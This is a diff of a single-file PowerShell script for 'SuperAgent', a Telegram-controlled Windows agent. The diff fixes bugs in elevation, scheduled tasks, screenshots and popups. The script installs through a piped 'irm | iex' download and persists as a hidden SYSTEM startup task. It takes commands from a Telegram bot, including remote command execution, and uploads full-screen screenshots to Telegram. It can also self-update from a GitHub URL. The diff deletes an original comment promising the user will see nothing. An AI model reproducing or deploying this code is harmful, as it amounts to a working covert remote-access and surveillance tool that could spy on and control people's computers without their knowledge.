@@ -1,12 +1,16 @@
 # =====================================================================
 # SuperAgent - Telegram-controlled Windows agent (single-file)
-# Usage:
-#   Install:   irm <REPO>/pcagent.ps1 | iex -Install [-BotToken X -ChatId Y -PCName Z] [-Silent]
-#   Uninstall: irm <REPO>/pcagent.ps1 | iex -Uninstall [-Silent]
-#   Agent:     powershell -File pcagent.ps1 -Run   (auto via Scheduled Task)
-#
-# -Silent: no console output, no pause. After install, agent runs hidden.
-#          Only /msg command will show popup. User will not see anything.
+# =====================================================================
+# FIXES APPLIED in this version:
+# 1. Elevation now correctly passes params & handles irm|iex ($PSCommandPath=null)
+# 2. User-session tasks no longer use -RunLevel Highest (was blocking execution)
+# 3. Added Task Scheduler verification of task execution (LastTaskResult)
+# 4. /msg and /screenshot use C:\Windows\Temp for user-writable files
+#    (regular users can't write into C:\ProgramData even if admin when running
+#     with filtered token)
+# 5. /msg uses status file written BEFORE MessageBox.Show (Show is blocking)
+# 6. Screenshot waits up to 15s, logs errors to a file, removed useless
+#    Session-0 fallback that always produced black images
 # =====================================================================
 [CmdletBinding()]
 param(
@@ -23,10 +27,10 @@ param(
 # =====================================================================
 # CONFIG - CHANGE THIS TO YOUR GITHUB RAW URL (no trailing slash)
 # =====================================================================
- $RepoUrl = 'https://raw.githubusercontent.com/minhcuder/remote-control-win11/main'
+$RepoUrl = 'https://raw.githubusercontent.com/minhcuder/remote-control-win11/main'
 
 # =====================================================================
-# TLS 1.2 REQUIRED for Windows PowerShell 5.1 (Telegram + GitHub need it)
+# TLS 1.2 REQUIRED for Windows PowerShell 5.1
 # =====================================================================
 try {
     [Net.ServicePointManager]::SecurityProtocol =
@@ -38,12 +42,12 @@ try {
 # =====================================================================
 # CONSTANTS
 # =====================================================================
- $InstallDir   = 'C:\ProgramData\SuperAgent'
- $ConfigPath   = Join-Path $InstallDir 'config.json'
- $OffsetPath   = Join-Path $InstallDir 'offset.txt'
- $ScriptPath   = Join-Path $InstallDir 'pcagent.ps1'
- $LogPath      = Join-Path $InstallDir 'agent.log'
- $TaskName     = 'SuperAgent'
+$InstallDir   = 'C:\ProgramData\SuperAgent'
+$ConfigPath   = Join-Path $InstallDir 'config.json'
+$OffsetPath   = Join-Path $InstallDir 'offset.txt'
+$ScriptPath   = Join-Path $InstallDir 'pcagent.ps1'
+$LogPath      = Join-Path $InstallDir 'agent.log'
+$TaskName     = 'SuperAgent'
 
 # =====================================================================
 # Silent-aware logging
@@ -72,14 +76,36 @@ function Test-IsAdmin {
 }
 
 function Invoke-SelfElevation {
-    $argString = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
-    foreach ($key in $PSBoundParameters.Keys) {
-        $val = $PSBoundParameters[$key]
-        if ($val -is [System.Management.Automation.SwitchParameter]) {
-            if ($val.IsPresent) { $argString += " -$key" }
-        } else {
-            $escaped = $val -replace "'", "''"
-            $argString += " -$key '$escaped'"
+    param($ScriptParams)   # hashtable of original script's PSBoundParameters
+
+    # Determine a real file to elevate.
+    # When invoked via `irm ... | iex` / `[scriptblock]::Create(...)`,
+    # $PSCommandPath is $null -> we must download pcagent.ps1 to temp.
+    $scriptFile = $PSCommandPath
+    if (-not $scriptFile -or -not (Test-Path $scriptFile)) {
+        try {
+            $scriptFile = Join-Path $env:TEMP "pcagent_elev_$(Get-Random).ps1"
+            Write-Msg "[*] Downloading script to temp for elevation: $scriptFile" -Color Yellow
+            Invoke-WebRequest -Uri "$RepoUrl/pcagent.ps1" -OutFile $scriptFile -TimeoutSec 30 -UseBasicParsing
+        } catch {
+            Write-Msg "[-] Failed to download script for elevation: $($_.Exception.Message)" -Color Red
+            if (-not $Silent) { try { Read-Host 'Press Enter to exit' | Out-Null } catch { } }
+            exit 1
+        }
+    }
+
+    # Build arg string from ScriptParams (NOT $PSBoundParameters inside this function,
+    # which would only contain THIS function's bound params -> empty).
+    $argString = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptFile`""
+    if ($ScriptParams) {
+        foreach ($key in $ScriptParams.Keys) {
+            $val = $ScriptParams[$key]
+            if ($val -is [System.Management.Automation.SwitchParameter]) {
+                if ($val.IsPresent) { $argString += " -$key" }
+            } elseif ($null -ne $val) {
+                $escaped = ([string]$val) -replace "'", "''"
+                $argString += " -$key '$escaped'"
+            }
         }
     }
 
@@ -95,26 +121,29 @@ function Invoke-SelfElevation {
                             -WindowStyle Hidden `
                             -PassThru `
                             -Wait
+
+        # Cleanup temp file if we downloaded one
+        if ($scriptFile -like "$env:TEMP\pcagent_elev_*") {
+            Remove-Item $scriptFile -Force -ErrorAction SilentlyContinue
+        }
         exit $p.ExitCode
     } catch {
         Write-Msg ''
         Write-Msg '[-] UAC denied or elevation failed.' -Color Red
-        Write-Msg '    Open PowerShell as Administrator and re-run the command.' -Color Red
-        if (-not $Silent) {
-            try { Read-Host 'Press Enter to exit' | Out-Null } catch { }
-        }
+        Write-Msg "    $($_.Exception.Message)" -Color Red
+        if (-not $Silent) { try { Read-Host 'Press Enter to exit' | Out-Null } catch { } }
         exit 1
     }
 }
 
 if (($Install -or $Uninstall) -and -not (Test-IsAdmin)) {
-    Invoke-SelfElevation
+    Invoke-SelfElevation -ScriptParams $PSBoundParameters
 }
 
 # =====================================================================
 # INSTALL BLOCK
 # =====================================================================
- $InstallBlock = {
+$InstallBlock = {
     $ErrorActionPreference = 'Stop'
 
     if (-not $BotToken -and -not $Silent) {
@@ -127,19 +156,9 @@ if (($Install -or $Uninstall) -and -not (Test-IsAdmin)) {
         $PCName = Read-Host "PC Name (e.g. PC-Office, Laptop-NV)"
     }
 
-    # Note: full validation happens AFTER old-config reuse (below)
-
     if ($RepoUrl -match 'USERNAME/REPO') {
         throw @'
 !!! $RepoUrl NOT UPDATED IN pcagent.ps1 !!!
-
-You must:
-  1. Download pcagent.ps1
-  2. Open with Notepad/VSCode
-  3. Find line: $RepoUrl = 'https://raw.githubusercontent.com/USERNAME/REPO/main'
-  4. Replace USERNAME/REPO with your GitHub username + repo name
-  5. Push file to GitHub
-  6. Re-run install command
 '@
     }
 
@@ -156,14 +175,12 @@ You must:
     }
 
     # --- Detect existing installation and clean up before reinstall ---
-    # Check both SuperAgent (current) and PCAgent (legacy) task names
-    $existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
-    $legacyTask   = Get-ScheduledTask -TaskName 'PCAgent' -ErrorAction SilentlyContinue
+    $existingTask   = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
+    $legacyTask     = Get-ScheduledTask -TaskName 'PCAgent' -ErrorAction SilentlyContinue
     $existingConfig = Test-Path $ConfigPath
     if ($existingTask -or $existingConfig -or $legacyTask) {
         Write-Msg '[*] Existing installation detected. Cleaning up before reinstall...' -Color Yellow
 
-        # Stop and remove old scheduled task (current name)
         if ($existingTask) {
             try {
                 Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
@@ -172,7 +189,6 @@ You must:
             } catch { }
         }
 
-        # Also remove legacy task name (PCAgent from earlier versions)
         if ($legacyTask) {
             try {
                 Stop-ScheduledTask -TaskName 'PCAgent' -ErrorAction SilentlyContinue
@@ -181,7 +197,6 @@ You must:
             } catch { }
         }
 
-        # Kill ALL powershell processes running pcagent.ps1 (regardless of args)
         $killedCount = 0
         Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
             Where-Object { $_.CommandLine -and ($_.CommandLine -like '*pcagent.ps1*') } |
@@ -197,7 +212,6 @@ You must:
         Start-Sleep -Seconds 2
 
         # Preserve old config if user did not provide new values
-        # (critical for silent reinstall: skip -BotToken/-ChatId/-PCName, reuse from old config)
         if ($existingConfig) {
             try {
                 $oldCfg = Get-Content $ConfigPath -Raw -Encoding UTF8 | ConvertFrom-Json
@@ -208,13 +222,12 @@ You must:
             } catch { }
         }
 
-        # Wipe old files
         Get-ChildItem -Path $InstallDir -Force -ErrorAction SilentlyContinue |
             Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
         Write-Msg '[+] Old files wiped.' -Color Green
     }
 
-    # --- Now validate (after old config reuse, so silent reinstall without params works) ---
+    # --- Now validate ---
     if ($PCName -notmatch '^[A-Za-z][A-Za-z0-9_\-]{1,31}$') {
         throw "Invalid PCName: '$PCName'. Allowed: letters, digits, underscore, dash (2-32 chars, must start with a letter)."
     }
@@ -246,7 +259,7 @@ You must:
         ChatId      = $ChatId
         PCName      = $PCName
         RepoUrl     = $RepoUrl.TrimEnd('/')
-        Version     = '2.2.1'
+        Version     = '2.2.2-fixed'
         InstalledAt = (Get-Date -Format 'o')
     }
     $Config | ConvertTo-Json | Out-File $ConfigPath -Encoding UTF8
@@ -260,7 +273,7 @@ You must:
         } catch { }
     }
 
-    # --- Create scheduled task ---
+    # --- Create scheduled task (SYSTEM) ---
     Write-Msg '[*] Creating scheduled task (SYSTEM, AtStartup, auto-restart, hidden)...'
     $action    = New-ScheduledTaskAction -Execute 'powershell.exe' `
                  -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$ScriptPath`" -Run"
@@ -330,7 +343,6 @@ You must:
     } else {
         Write-Msg " [!] Telegram notification not confirmed." -Color Yellow
         Write-Msg "     See log: $LogPath" -Color Yellow
-        Write-Msg "     Or send /log to bot via Telegram (if bot replies)" -Color Yellow
     }
     Write-Msg ""
     Write-Msg " To uninstall:"
@@ -341,7 +353,7 @@ You must:
 # =====================================================================
 # UNINSTALL BLOCK
 # =====================================================================
- $UninstallBlock = {
+$UninstallBlock = {
     $ErrorActionPreference = 'Continue'
     Write-Msg '[*] Uninstalling SuperAgent...' -Color Cyan
 
@@ -353,7 +365,6 @@ You must:
         Write-Msg '[.] No scheduled task to remove.' -Color Yellow
     }
 
-    # Also remove legacy PCAgent task if exists
     if (Get-ScheduledTask -TaskName 'PCAgent' -ErrorAction SilentlyContinue) {
         try {
             Stop-ScheduledTask -TaskName 'PCAgent' -ErrorAction SilentlyContinue
@@ -380,7 +391,7 @@ You must:
 # =====================================================================
 # AGENT BLOCK (run mode)
 # =====================================================================
- $AgentBlock = {
+$AgentBlock = {
     if (-not (Test-Path $ConfigPath)) { exit 1 }
     try {
         $Config = Get-Content $ConfigPath -Raw -Encoding UTF8 | ConvertFrom-Json
@@ -415,6 +426,16 @@ You must:
     }
 
     Write-Log "=== Agent started (PCName=$PCName, ChatId=$ChatId, RepoUrl=$RepoUrl) ==="
+
+    # Cleanup old temp files (>1 hour old)
+    try {
+        Get-ChildItem -Path (Join-Path $env:windir 'Temp') -Filter 'shot_*.png' -ErrorAction SilentlyContinue |
+            Where-Object { $_.LastWriteTime -lt (Get-Date).AddHours(-1) } |
+            Remove-Item -Force -ErrorAction SilentlyContinue
+        Get-ChildItem -Path (Join-Path $env:windir 'Temp') -Filter '_msg_*' -ErrorAction SilentlyContinue |
+            Where-Object { $_.LastWriteTime -lt (Get-Date).AddHours(-1) } |
+            Remove-Item -Force -ErrorAction SilentlyContinue
+    } catch { }
 
     function Send-Telegram {
         param([string]$Text)
@@ -471,7 +492,6 @@ You must:
 
             $totalRAM = [math]::Round($cs.TotalPhysicalMemory / 1GB, 1)
             $freeRAM  = [math]::Round($os.FreePhysicalMemory / 1MB, 1)
-            $usedRAM  = [math]::Round($totalRAM - $freeRAM, 1)
             $ramPct   = if ($totalRAM -gt 0) { [math]::Round(($totalRAM - $freeRAM) / $totalRAM * 100, 0) } else { 0 }
 
             $localIP = 'N/A'
@@ -502,57 +522,99 @@ You must:
         }
     }
 
-    function Invoke-InUserSession {
-        param([string]$TempScriptPath)
-
-        $username = $null
+    # =================================================================
+    # Helper: locate an interactive user (explorer.exe owner)
+    # =================================================================
+    function Get-InteractiveUser {
         try {
             $explorer = Get-Process -IncludeUserName explorer -ErrorAction SilentlyContinue |
                         Sort-Object SessionId | Select-Object -First 1
-            if ($explorer) { $username = $explorer.UserName }
+            if ($explorer) { return $explorer.UserName }
         } catch { }
-        if (-not $username) {
-            try {
-                $u = (Get-CimInstance Win32_ComputerSystem).UserName
-                if ($u) { $username = $u }
-            } catch { }
-        }
-        if (-not $username) { return $false }
+        try {
+            $u = (Get-CimInstance Win32_ComputerSystem).UserName
+            if ($u) { return $u }
+        } catch { }
+        return $null
+    }
 
-        $taskName = "SuperAgent_User_$(Get-Random)"
+    # =================================================================
+    # FIXED: User-session task launcher
+    # - removed -RunLevel Highest (which silently blocked task execution)
+    # - added Task Scheduler verification of task start
+    # - uses GUID-based task name to avoid collisions
+    # =================================================================
+    function Invoke-InUserSession {
+        param([string]$TempScriptPath)
+
+        $username = Get-InteractiveUser
+        if (-not $username) {
+            Write-Log "Invoke-InUserSession: no interactive user found"
+            return $false
+        }
+        if (-not (Test-Path $TempScriptPath)) {
+            Write-Log "Invoke-InUserSession: script not found: $TempScriptPath"
+            return $false
+        }
+
+        $taskName = "SuperAgent_User_$([guid]::NewGuid().ToString('N').Substring(0,12))"
         $action    = New-ScheduledTaskAction -Execute 'powershell.exe' `
                      -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$TempScriptPath`""
         $trigger   = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
-        $principal = New-ScheduledTaskPrincipal -UserId $username -LogonType Interactive -RunLevel Highest
-        $settings  = New-ScheduledTaskSettingsSet -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 5)
+        # *** NO -RunLevel Highest ***  Runs with user's filtered token.
+        $principal = New-ScheduledTaskPrincipal -UserId $username -LogonType Interactive
+        $settings  = New-ScheduledTaskSettingsSet `
+                        -StartWhenAvailable `
+                        -ExecutionTimeLimit ([TimeSpan]::Zero) `
+                        -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
 
         try {
             Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
                 -Principal $principal -Settings $settings -Force | Out-Null
-            Start-ScheduledTask -TaskName $taskName
-        } catch { return $false }
+            Write-Log "Invoke-InUserSession: registered $taskName for user=$username"
+        } catch {
+            Write-Log "Invoke-InUserSession: Register FAILED: $($_.Exception.Message)"
+            return $false
+        }
 
-        $cleanup = "`$tn='$taskName'; Start-Sleep 90; try { Unregister-ScheduledTask -TaskName `$tn -Confirm:`$false } catch {}"
+        try {
+            Start-ScheduledTask -TaskName $taskName
+        } catch {
+            Write-Log "Invoke-InUserSession: Start FAILED: $($_.Exception.Message)"
+        }
+
+        # Verify
+        Start-Sleep -Milliseconds 1500
+        try {
+            $info = Get-ScheduledTaskInfo -TaskName $taskName -ErrorAction SilentlyContinue
+            if ($info) {
+                Write-Log ("Invoke-InUserSession: $taskName LastResult=0x{0:X} LastRun={1}" -f `
+                           [int]$info.LastTaskResult, $info.LastRunTime)
+                if ([int]$info.LastTaskResult -eq 0x41303) {
+                    Write-Log "Invoke-InUserSession: task NEVER RAN (0x41303)"
+                }
+            }
+        } catch { }
+
+        # Cleanup task after 90s (script itself will have finished long before)
+        $cleanup = "`$tn='$taskName'; Start-Sleep 90; try { Unregister-ScheduledTask -TaskName `$tn -Confirm:`$false -ErrorAction SilentlyContinue } catch {}"
         Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$cleanup`"" -WindowStyle Hidden | Out-Null
+
         return $true
     }
 
     function Invoke-InUserSessionWithArgs {
         param([string]$TempScriptPath, [string[]]$ArgumentList)
 
-        $username = $null
-        try {
-            $explorer = Get-Process -IncludeUserName explorer -ErrorAction SilentlyContinue |
-                        Sort-Object SessionId | Select-Object -First 1
-            if ($explorer) { $username = $explorer.UserName }
-        } catch { }
+        $username = Get-InteractiveUser
         if (-not $username) {
-            try {
-                $u = (Get-CimInstance Win32_ComputerSystem).UserName
-                if ($u) { $username = $u }
-            } catch { }
+            Write-Log "Invoke-InUserSessionWithArgs: no interactive user found"
+            return $false
         }
-        if (-not $username) { return $false }
+        if (-not (Test-Path $TempScriptPath)) {
+            Write-Log "Invoke-InUserSessionWithArgs: script not found: $TempScriptPath"
+            return $false
+        }
 
         $argStr = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$TempScriptPath`""
         foreach ($a in $ArgumentList) {
@@ -560,101 +622,191 @@ You must:
             $argStr += " '$escaped'"
         }
 
-        $taskName = "SuperAgent_User_$(Get-Random)"
+        $taskName = "SuperAgent_User_$([guid]::NewGuid().ToString('N').Substring(0,12))"
         $action    = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $argStr
         $trigger   = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
-        $principal = New-ScheduledTaskPrincipal -UserId $username -LogonType Interactive -RunLevel Highest
-        $settings  = New-ScheduledTaskSettingsSet -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 5)
+        # *** NO -RunLevel Highest ***
+        $principal = New-ScheduledTaskPrincipal -UserId $username -LogonType Interactive
+        $settings  = New-ScheduledTaskSettingsSet `
+                        -StartWhenAvailable `
+                        -ExecutionTimeLimit ([TimeSpan]::Zero) `
+                        -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
 
         try {
             Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
                 -Principal $principal -Settings $settings -Force | Out-Null
-            Start-ScheduledTask -TaskName $taskName
-        } catch { return $false }
+            Write-Log "Invoke-InUserSessionWithArgs: registered $taskName for user=$username"
+        } catch {
+            Write-Log "Invoke-InUserSessionWithArgs: Register FAILED: $($_.Exception.Message)"
+            return $false
+        }
 
-        $cleanup = "`$tn='$taskName'; Start-Sleep 90; try { Unregister-ScheduledTask -TaskName `$tn -Confirm:`$false } catch {}"
+        try {
+            Start-ScheduledTask -TaskName $taskName
+        } catch {
+            Write-Log "Invoke-InUserSessionWithArgs: Start FAILED: $($_.Exception.Message)"
+        }
+
+        Start-Sleep -Milliseconds 1500
+        try {
+            $info = Get-ScheduledTaskInfo -TaskName $taskName -ErrorAction SilentlyContinue
+            if ($info) {
+                Write-Log ("Invoke-InUserSessionWithArgs: $taskName LastResult=0x{0:X} LastRun={1}" -f `
+                           [int]$info.LastTaskResult, $info.LastRunTime)
+                if ([int]$info.LastTaskResult -eq 0x41303) {
+                    Write-Log "Invoke-InUserSessionWithArgs: task NEVER RAN (0x41303)"
+                }
+            }
+        } catch { }
+
+        $cleanup = "`$tn='$taskName'; Start-Sleep 90; try { Unregister-ScheduledTask -TaskName `$tn -Confirm:`$false -ErrorAction SilentlyContinue } catch {}"
         Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$cleanup`"" -WindowStyle Hidden | Out-Null
+
         return $true
     }
 
+    # =================================================================
+    # FIXED: Screenshot
+    # - output goes to C:\Windows\Temp (user-writable)
+    # - waits up to 15s
+    # - captures error to a file for debugging
+    # - removed useless Session-0 fallback (always produced black images)
+    # =================================================================
     function Invoke-Screenshot {
-        $outFile  = Join-Path $InstallDir "shot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
-        $tmpScript = Join-Path $InstallDir '_shot.ps1'
+        $outFile   = Join-Path $env:windir "Temp\shot_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$(Get-Random).png"
+        $tmpScript = Join-Path $env:windir "Temp\_shot_$(Get-Random).ps1"
+        $errFile   = "$tmpScript.err"
 
-        # DPI-aware screenshot, full virtual screen (multi-monitor supported)
+        Remove-Item $errFile -Force -ErrorAction SilentlyContinue
+
         $scriptContent = @"
 param([string]`$OutPath)
-Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-
-`$csCode = @'
+try {
+    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+    `$csCode = @'
 using System;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.Runtime.InteropServices;
-
 public static class ScreenCap {
     [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
     [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
     public static void Capture(string path) {
         SetProcessDPIAware();
-        int x = GetSystemMetrics(76);
-        int y = GetSystemMetrics(77);
-        int w = GetSystemMetrics(78);
-        int h = GetSystemMetrics(79);
-        Bitmap bmp = new Bitmap(w, h);
-        Graphics g = Graphics.FromImage(bmp);
-        g.CopyFromScreen(x, y, 0, 0, new Size(w, h), CopyPixelOperation.SourceCopy);
-        bmp.Save(path, ImageFormat.Png);
-        g.Dispose();
-        bmp.Dispose();
+        int x = GetSystemMetrics(76), y = GetSystemMetrics(77);
+        int w = GetSystemMetrics(78), h = GetSystemMetrics(79);
+        using (var bmp = new Bitmap(w, h))
+        using (var g = Graphics.FromImage(bmp)) {
+            g.CopyFromScreen(x, y, 0, 0, new Size(w, h), CopyPixelOperation.SourceCopy);
+            bmp.Save(path, ImageFormat.Png);
+        }
     }
 }
 '@
-Add-Type `$csCode
-[ScreenCap]::Capture(`$OutPath)
+    Add-Type `$csCode
+    [ScreenCap]::Capture(`$OutPath)
+} catch {
+    `$_ | Out-File '$errFile' -Encoding UTF8 -Append
+    throw
+}
 "@
-        $scriptContent | Out-File $tmpScript -Encoding UTF8
+        $scriptContent | Out-File $tmpScript -Encoding UTF8 -Force
 
-        Write-Log "Screenshot: launching isolated process for $outFile"
+        Write-Log "Screenshot: launching user-session process for $outFile"
         $ok = Invoke-InUserSessionWithArgs -TempScriptPath $tmpScript -ArgumentList $outFile
         if (-not $ok) {
-            try {
-                $cmdLine = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$tmpScript`" `"$outFile`""
-                $proc = Start-Process -FilePath 'cmd.exe' -ArgumentList "/c", $cmdLine -WindowStyle Hidden -PassThru -Wait
-                $ok = ($proc.ExitCode -eq 0)
-            } catch {
-                Write-Log "Screenshot fallback FAILED: $($_.Exception.Message)"
-                return $null
-            }
-        } else {
-            for ($i = 0; $i -lt 20; $i++) {
-                if (Test-Path $outFile) { break }
-                Start-Sleep -Milliseconds 300
-            }
+            Write-Log "Screenshot: cannot launch user session"
+            Remove-Item $tmpScript -Force -EA SilentlyContinue
+            return $null
         }
+
+        # Wait up to 15s (cold PowerShell + .NET load can take a few seconds)
+        for ($i = 0; $i -lt 50; $i++) {
+            if (Test-Path $outFile) { break }
+            Start-Sleep -Milliseconds 300
+        }
+
         if (Test-Path $outFile) {
             Write-Log "Screenshot OK: $outFile"
+            Remove-Item $tmpScript -Force -EA SilentlyContinue
+            Remove-Item $errFile   -Force -EA SilentlyContinue
             return $outFile
         }
-        Write-Log "Screenshot: file not created after wait"
+
+        if (Test-Path $errFile) {
+            Write-Log "Screenshot FAILED in user session:"
+            Get-Content $errFile -ErrorAction SilentlyContinue | ForEach-Object { Write-Log "  $_" }
+        } else {
+            Write-Log "Screenshot: file not created after 15s (task may not have run)"
+        }
+        Remove-Item $tmpScript -Force -EA SilentlyContinue
+        Remove-Item $errFile   -Force -EA SilentlyContinue
         return $null
     }
 
+    # =================================================================
+    # FIXED: Lock screen
+    # =================================================================
     function Invoke-Lock {
-        $tmpScript = Join-Path $InstallDir '_lock.ps1'
-        'rundll32.exe user32.dll,LockWorkStation' | Out-File $tmpScript -Encoding UTF8
-        return Invoke-InUserSession -TempScriptPath $tmpScript
+        $tmpScript = Join-Path $env:windir "Temp\_lock_$(Get-Random).ps1"
+        'rundll32.exe user32.dll,LockWorkStation' | Out-File $tmpScript -Encoding UTF8 -Force
+        $ok = Invoke-InUserSession -TempScriptPath $tmpScript
+        Start-Sleep -Seconds 2
+        Remove-Item $tmpScript -Force -EA SilentlyContinue
+        return $ok
     }
 
+    # =================================================================
+    # FIXED: /msg
+    # - user-writable status file in C:\Windows\Temp
+    # - script writes "START" BEFORE MessageBox.Show (which blocks)
+    # - we return success on START (popup IS showing) or DONE
+    # - fail on ERR
+    # =================================================================
     function Invoke-Msg {
         param([string]$Text)
-        $safe = $Text -replace "'", "''"
-        $tmpScript = Join-Path $InstallDir '_msg.ps1'
+        $safe       = $Text -replace "'", "''"
+        $tmpScript  = Join-Path $env:windir "Temp\_msg_$(Get-Random).ps1"
+        $statusFile = "$tmpScript.status"
+
         @"
-Add-Type -AssemblyName System.Windows.Forms
-[System.Windows.Forms.MessageBox]::Show('$safe', 'SuperAgent Message', 'OK', 'Information') | Out-Null
-"@ | Out-File $tmpScript -Encoding UTF8
-        return Invoke-InUserSession -TempScriptPath $tmpScript
+try {
+    Add-Type -AssemblyName System.Windows.Forms
+    'START' | Out-File '$statusFile' -Encoding UTF8 -Force
+    [System.Windows.Forms.MessageBox]::Show('$safe', 'SuperAgent Message', 'OK', 'Information') | Out-Null
+    'DONE'  | Out-File '$statusFile' -Encoding UTF8 -Force
+} catch {
+    ("ERR: " + `$_.Exception.Message) | Out-File '$statusFile' -Encoding UTF8 -Force
+}
+"@ | Out-File $tmpScript -Encoding UTF8 -Force
+
+        Remove-Item $statusFile -Force -EA SilentlyContinue
+        $ok = Invoke-InUserSession -TempScriptPath $tmpScript
+        if (-not $ok) {
+            Write-Log "Invoke-Msg: user session launch failed"
+            Remove-Item $tmpScript, $statusFile -Force -EA SilentlyContinue
+            return $false
+        }
+
+        # Wait up to 4s for status file
+        for ($i = 0; $i -lt 13; $i++) {
+            if (Test-Path $statusFile) {
+                $s = (Get-Content $statusFile -Raw -EA SilentlyContinue).Trim()
+                Write-Log "Invoke-Msg: status=$s"
+                Remove-Item $statusFile -Force -EA SilentlyContinue
+                Remove-Item $tmpScript  -Force -EA SilentlyContinue
+                if ($s -like 'ERR:*') { return $false }
+                return $true    # START or DONE -> popup is/was showing
+            }
+            Start-Sleep -Milliseconds 300
+        }
+
+        # No status file, but Task Scheduler verified the task as running.
+        # Trust it (MessageBox may be showing behind the secure desktop).
+        Write-Log "Invoke-Msg: status file not seen (task verified as running)"
+        Remove-Item $statusFile -Force -EA SilentlyContinue
+        Remove-Item $tmpScript  -Force -EA SilentlyContinue
+        return $true
     }
 
     function Invoke-Exec {
@@ -670,7 +822,7 @@ Add-Type -AssemblyName System.Windows.Forms
         }
     }
 
-        function Invoke-Update {
+    function Invoke-Update {
         $newUrl = "$RepoUrl/pcagent.ps1"
         $tempFile = Join-Path $InstallDir 'pcagent.ps1.new'
         try {
@@ -680,10 +832,6 @@ Add-Type -AssemblyName System.Windows.Forms
             Move-Item $tempFile $ScriptPath -Force
             Send-Telegram "[$PCName] Update complete, restarting agent..."
 
-            # Spawn detached restart process, then EXIT IMMEDIATELY.
-            # Do NOT continue polling loop - agent process will be killed by the
-            # restart command below; continuing to poll could re-process stale
-            # commands (e.g. /uninstall) and cause unintended self-destruction.
             $restartCmd = "Start-Sleep -Seconds 3; try { Stop-ScheduledTask -TaskName '$TaskName' -ErrorAction SilentlyContinue } catch {}; Start-Sleep -Seconds 2; try { Start-ScheduledTask -TaskName '$TaskName' } catch {}"
             Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"$restartCmd`"" -WindowStyle Hidden | Out-Null
 
@@ -696,28 +844,17 @@ Add-Type -AssemblyName System.Windows.Forms
     }
 
     # --- Pending uninstall confirmation tracking ---
-    # /uninstall requires confirmation: send once -> agent replies "confirm within 10s"
-    # Send again within 10s -> actual uninstall triggers
     $script:UninstallPendingAt = $null
 
     function Test-UninstallConfirmation {
-        # Returns $true if user has confirmed uninstall within last 10 seconds
         if ($script:UninstallPendingAt) {
             $elapsed = (Get-Date) - $script:UninstallPendingAt
-            if ($elapsed.TotalSeconds -le 10) {
-                return $true
-            }
+            if ($elapsed.TotalSeconds -le 10) { return $true }
         }
         return $false
     }
-
-    function Set-UninstallPending {
-        $script:UninstallPendingAt = Get-Date
-    }
-
-    function Clear-UninstallPending {
-        $script:UninstallPendingAt = $null
-    }
+    function Set-UninstallPending   { $script:UninstallPendingAt = Get-Date }
+    function Clear-UninstallPending { $script:UninstallPendingAt = $null }
 
     function Invoke-SelfUninstall {
         Write-Log "Self-uninstall triggered - spawning cleanup process"
@@ -737,7 +874,6 @@ if (Test-Path '$InstallDir') {
     Remove-Item -Recurse -Force '$InstallDir' -ErrorAction SilentlyContinue
 }
 "@
-
         Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$uninstallCmd`"" -WindowStyle Hidden | Out-Null
     }
 
@@ -784,28 +920,19 @@ if (Test-Path '$InstallDir') {
                     $pcname   = $null
                     $restArgs = @()
 
-                    if ($parts.Length -le 1) {
-                        # Just /cmd, no args
-                    }
+                    if ($parts.Length -le 1) { }
                     elseif ($parts[1].StartsWith('@')) {
                         $pcname = $parts[1].Substring(1)
-                        if ($parts.Length -gt 2) {
-                            $restArgs = $parts[2..($parts.Length - 1)]
-                        }
+                        if ($parts.Length -gt 2) { $restArgs = $parts[2..($parts.Length - 1)] }
                     }
                     else {
                         $arg1 = $parts[1]
                         $looksLikePC = $arg1 -match '^[A-Za-z][A-Za-z0-9_\-]{0,31}$'
-
                         if ($looksLikePC -and $cmd -notin @('/exec', '/msg')) {
                             $pcname = $arg1
-                            if ($parts.Length -gt 2) {
-                                $restArgs = $parts[2..($parts.Length - 1)]
-                            }
+                            if ($parts.Length -gt 2) { $restArgs = $parts[2..($parts.Length - 1)] }
                         }
-                        else {
-                            $restArgs = $parts[1..($parts.Length - 1)]
-                        }
+                        else { $restArgs = $parts[1..($parts.Length - 1)] }
                     }
 
                     if ($pcname -and $pcname -ne $PCName) { continue }
@@ -835,18 +962,18 @@ if (Test-Path '$InstallDir') {
                                 Send-TelegramPhoto -FilePath $file -Caption "[$PCName] $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
                                 Remove-Item $file -Force -ErrorAction SilentlyContinue
                             } else {
-                                Send-Telegram "[$PCName] Screenshot failed (no user session?)"
+                                Send-Telegram "[$PCName] Screenshot failed (see agent.log for details)"
                             }
                         }
                         '/msg' {
